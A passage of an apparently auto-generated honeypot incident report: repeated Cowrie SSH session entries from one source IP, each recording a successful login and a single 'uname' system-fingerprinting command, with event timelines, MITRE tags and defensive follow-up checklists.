| `2026-08-08 17:16:04` | `cowrie.session.connect` |
| `2026-08-08 17:16:04` | `cowrie.client.version` |
| `2026-08-08 17:16:04` | `cowrie.client.kex` |
| `2026-08-08 17:16:04` | `cowrie.login.success` |
| `2026-08-08 17:16:05` | `cowrie.session.params` |
| `2026-08-08 17:16:05` | `cowrie.command.input` |
| `2026-08-08 17:16:05` | `cowrie.log.closed` |
| `2026-08-08 17:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d1db478947

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:10` | `cowrie.session.connect` |
| `2026-08-08 17:16:10` | `cowrie.client.version` |
| `2026-08-08 17:16:10` | `cowrie.client.kex` |
| `2026-08-08 17:16:10` | `cowrie.login.success` |
| `2026-08-08 17:16:11` | `cowrie.session.params` |
| `2026-08-08 17:16:11` | `cowrie.command.input` |
| `2026-08-08 17:16:11` | `cowrie.log.closed` |
| `2026-08-08 17:16:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3ab938cdc4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:17` | `cowrie.session.connect` |
| `2026-08-08 17:16:17` | `cowrie.client.version` |
| `2026-08-08 17:16:17` | `cowrie.client.kex` |
| `2026-08-08 17:16:18` | `cowrie.login.success` |
| `2026-08-08 17:16:19` | `cowrie.session.params` |
| `2026-08-08 17:16:19` | `cowrie.command.input` |
| `2026-08-08 17:16:19` | `cowrie.log.closed` |
| `2026-08-08 17:16:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3615d07ac62e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:24` | `cowrie.session.connect` |
| `2026-08-08 17:16:24` | `cowrie.client.version` |
| `2026-08-08 17:16:24` | `cowrie.client.kex` |
| `2026-08-08 17:16:25` | `cowrie.login.success` |
| `2026-08-08 17:16:26` | `cowrie.session.params` |
| `2026-08-08 17:16:26` | `cowrie.command.input` |
| `2026-08-08 17:16:26` | `cowrie.log.closed` |
| `2026-08-08 17:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28fba4032132

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:31` | `cowrie.session.connect` |
| `2026-08-08 17:16:31` | `cowrie.client.version` |
| `2026-08-08 17:16:31` | `cowrie.client.kex` |
| `2026-08-08 17:16:32` | `cowrie.login.success` |
| `2026-08-08 17:16:33` | `cowrie.session.params` |
| `2026-08-08 17:16:33` | `cowrie.command.input` |
| `2026-08-08 17:16:33` | `cowrie.log.closed` |
| `2026-08-08 17:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160a2c505858

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:38` | `cowrie.session.connect` |
| `2026-08-08 17:16:38` | `cowrie.client.version` |
| `2026-08-08 17:16:38` | `cowrie.client.kex` |
| `2026-08-08 17:16:38` | `cowrie.login.success` |
| `2026-08-08 17:16:39` | `cowrie.session.params` |
| `2026-08-08 17:16:39` | `cowrie.command.input` |
| `2026-08-08 17:16:40` | `cowrie.log.closed` |
| `2026-08-08 17:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa57c677ff2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:44` | `cowrie.session.connect` |
| `2026-08-08 17:16:44` | `cowrie.client.version` |
| `2026-08-08 17:16:44` | `cowrie.client.kex` |
| `2026-08-08 17:16:44` | `cowrie.login.success` |
| `2026-08-08 17:16:45` | `cowrie.session.params` |
| `2026-08-08 17:16:45` | `cowrie.command.input` |
| `2026-08-08 17:16:45` | `cowrie.log.closed` |
| `2026-08-08 17:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b83eb6048a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:49` | `cowrie.session.connect` |
| `2026-08-08 17:16:49` | `cowrie.client.version` |
| `2026-08-08 17:16:50` | `cowrie.client.kex` |
| `2026-08-08 17:16:50` | `cowrie.login.success` |
| `2026-08-08 17:16:51` | `cowrie.session.params` |
| `2026-08-08 17:16:51` | `cowrie.command.input` |
| `2026-08-08 17:16:51` | `cowrie.log.closed` |
| `2026-08-08 17:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c075b4b38e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:16 |
| **Last Seen** | 2026-08-08 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:16:55` | `cowrie.session.connect` |
| `2026-08-08 17:16:55` | `cowrie.client.version` |
| `2026-08-08 17:16:55` | `cowrie.client.kex` |
| `2026-08-08 17:16:56` | `cowrie.login.success` |
| `2026-08-08 17:16:57` | `cowrie.session.params` |
| `2026-08-08 17:16:57` | `cowrie.command.input` |
| `2026-08-08 17:16:57` | `cowrie.log.closed` |
| `2026-08-08 17:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c704811c2c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:02` | `cowrie.session.connect` |
| `2026-08-08 17:17:02` | `cowrie.client.version` |
| `2026-08-08 17:17:02` | `cowrie.client.kex` |
| `2026-08-08 17:17:03` | `cowrie.login.success` |
| `2026-08-08 17:17:03` | `cowrie.session.params` |
| `2026-08-08 17:17:03` | `cowrie.command.input` |
| `2026-08-08 17:17:04` | `cowrie.log.closed` |
| `2026-08-08 17:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c4f0ecdf4bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:09` | `cowrie.session.connect` |
| `2026-08-08 17:17:09` | `cowrie.client.version` |
| `2026-08-08 17:17:09` | `cowrie.client.kex` |
| `2026-08-08 17:17:10` | `cowrie.login.success` |
| `2026-08-08 17:17:11` | `cowrie.session.params` |
| `2026-08-08 17:17:11` | `cowrie.command.input` |
| `2026-08-08 17:17:11` | `cowrie.log.closed` |
| `2026-08-08 17:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3753b272067c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:15` | `cowrie.session.connect` |
| `2026-08-08 17:17:15` | `cowrie.client.version` |
| `2026-08-08 17:17:15` | `cowrie.client.kex` |
| `2026-08-08 17:17:16` | `cowrie.login.success` |
| `2026-08-08 17:17:17` | `cowrie.session.params` |
| `2026-08-08 17:17:17` | `cowrie.command.input` |
| `2026-08-08 17:17:17` | `cowrie.log.closed` |
| `2026-08-08 17:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db9b229b544

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:21` | `cowrie.session.connect` |
| `2026-08-08 17:17:21` | `cowrie.client.version` |
| `2026-08-08 17:17:21` | `cowrie.client.kex` |
| `2026-08-08 17:17:22` | `cowrie.login.success` |
| `2026-08-08 17:17:23` | `cowrie.session.params` |
| `2026-08-08 17:17:23` | `cowrie.command.input` |
| `2026-08-08 17:17:23` | `cowrie.log.closed` |
| `2026-08-08 17:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4b95429e450

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:27` | `cowrie.session.connect` |
| `2026-08-08 17:17:28` | `cowrie.client.version` |
| `2026-08-08 17:17:28` | `cowrie.client.kex` |
| `2026-08-08 17:17:29` | `cowrie.login.success` |
| `2026-08-08 17:17:30` | `cowrie.session.params` |
| `2026-08-08 17:17:30` | `cowrie.command.input` |
| `2026-08-08 17:17:31` | `cowrie.log.closed` |
| `2026-08-08 17:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df49795b538b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:34` | `cowrie.session.connect` |
| `2026-08-08 17:17:34` | `cowrie.client.version` |
| `2026-08-08 17:17:34` | `cowrie.client.kex` |
| `2026-08-08 17:17:35` | `cowrie.login.success` |
| `2026-08-08 17:17:36` | `cowrie.session.params` |
| `2026-08-08 17:17:36` | `cowrie.command.input` |
| `2026-08-08 17:17:36` | `cowrie.log.closed` |
| `2026-08-08 17:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc473b0e13b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:40` | `cowrie.session.connect` |
| `2026-08-08 17:17:40` | `cowrie.client.version` |
| `2026-08-08 17:17:40` | `cowrie.client.kex` |
| `2026-08-08 17:17:41` | `cowrie.login.success` |
| `2026-08-08 17:17:42` | `cowrie.session.params` |
| `2026-08-08 17:17:42` | `cowrie.command.input` |
| `2026-08-08 17:17:42` | `cowrie.log.closed` |
| `2026-08-08 17:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4a29cc1ee4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:46` | `cowrie.session.connect` |
| `2026-08-08 17:17:46` | `cowrie.client.version` |
| `2026-08-08 17:17:46` | `cowrie.client.kex` |
| `2026-08-08 17:17:47` | `cowrie.login.success` |
| `2026-08-08 17:17:48` | `cowrie.session.params` |
| `2026-08-08 17:17:48` | `cowrie.command.input` |
| `2026-08-08 17:17:48` | `cowrie.log.closed` |
| `2026-08-08 17:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc86f2a74d6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:17 |
| **Last Seen** | 2026-08-08 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:17:54` | `cowrie.session.connect` |
| `2026-08-08 17:17:54` | `cowrie.client.version` |
| `2026-08-08 17:17:54` | `cowrie.client.kex` |
| `2026-08-08 17:17:54` | `cowrie.login.success` |
| `2026-08-08 17:17:55` | `cowrie.session.params` |
| `2026-08-08 17:17:55` | `cowrie.command.input` |
| `2026-08-08 17:17:56` | `cowrie.log.closed` |
| `2026-08-08 17:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ffd1e9e9848

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:01` | `cowrie.session.connect` |
| `2026-08-08 17:18:01` | `cowrie.client.version` |
| `2026-08-08 17:18:01` | `cowrie.client.kex` |
| `2026-08-08 17:18:01` | `cowrie.login.success` |
| `2026-08-08 17:18:02` | `cowrie.session.params` |
| `2026-08-08 17:18:02` | `cowrie.command.input` |
| `2026-08-08 17:18:03` | `cowrie.log.closed` |
| `2026-08-08 17:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f86abb8b0f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:08` | `cowrie.session.connect` |
| `2026-08-08 17:18:08` | `cowrie.client.version` |
| `2026-08-08 17:18:08` | `cowrie.client.kex` |
| `2026-08-08 17:18:08` | `cowrie.login.success` |
| `2026-08-08 17:18:09` | `cowrie.session.params` |
| `2026-08-08 17:18:09` | `cowrie.command.input` |
| `2026-08-08 17:18:09` | `cowrie.log.closed` |
| `2026-08-08 17:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4146e2dd34c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:14` | `cowrie.session.connect` |
| `2026-08-08 17:18:14` | `cowrie.client.version` |
| `2026-08-08 17:18:14` | `cowrie.client.kex` |
| `2026-08-08 17:18:15` | `cowrie.login.success` |
| `2026-08-08 17:18:16` | `cowrie.session.params` |
| `2026-08-08 17:18:16` | `cowrie.command.input` |
| `2026-08-08 17:18:16` | `cowrie.log.closed` |
| `2026-08-08 17:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c6e15db396

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:20` | `cowrie.session.connect` |
| `2026-08-08 17:18:21` | `cowrie.client.version` |
| `2026-08-08 17:18:21` | `cowrie.client.kex` |
| `2026-08-08 17:18:21` | `cowrie.login.success` |
| `2026-08-08 17:18:22` | `cowrie.session.params` |
| `2026-08-08 17:18:22` | `cowrie.command.input` |
| `2026-08-08 17:18:22` | `cowrie.log.closed` |
| `2026-08-08 17:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f27115a6ba5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:28` | `cowrie.session.connect` |
| `2026-08-08 17:18:28` | `cowrie.client.version` |
| `2026-08-08 17:18:28` | `cowrie.client.kex` |
| `2026-08-08 17:18:28` | `cowrie.login.success` |
| `2026-08-08 17:18:29` | `cowrie.session.params` |
| `2026-08-08 17:18:29` | `cowrie.command.input` |
| `2026-08-08 17:18:29` | `cowrie.log.closed` |
| `2026-08-08 17:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-594790bdbbbe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:34` | `cowrie.session.connect` |
| `2026-08-08 17:18:34` | `cowrie.client.version` |
| `2026-08-08 17:18:34` | `cowrie.client.kex` |
| `2026-08-08 17:18:35` | `cowrie.login.success` |
| `2026-08-08 17:18:36` | `cowrie.session.params` |
| `2026-08-08 17:18:36` | `cowrie.command.input` |
| `2026-08-08 17:18:36` | `cowrie.log.closed` |
| `2026-08-08 17:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94965f6c029

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:41` | `cowrie.session.connect` |
| `2026-08-08 17:18:41` | `cowrie.client.version` |
| `2026-08-08 17:18:41` | `cowrie.client.kex` |
| `2026-08-08 17:18:41` | `cowrie.login.success` |
| `2026-08-08 17:18:42` | `cowrie.session.params` |
| `2026-08-08 17:18:42` | `cowrie.command.input` |
| `2026-08-08 17:18:43` | `cowrie.log.closed` |
| `2026-08-08 17:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93cd30701de0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:18 |
| **Last Seen** | 2026-08-08 17:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:18:47` | `cowrie.session.connect` |
| `2026-08-08 17:18:47` | `cowrie.client.version` |
| `2026-08-08 17:18:47` | `cowrie.client.kex` |
| `2026-08-08 17:18:48` | `cowrie.login.success` |
| `2026-08-08 17:18:49` | `cowrie.session.params` |
| `2026-08-08 17:18:49` | `cowrie.command.input` |
| `2026-08-08 17:18:49` | `cowrie.log.closed` |
| `2026-08-08 17:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5406735378

| Field | Detail |
|---|---|
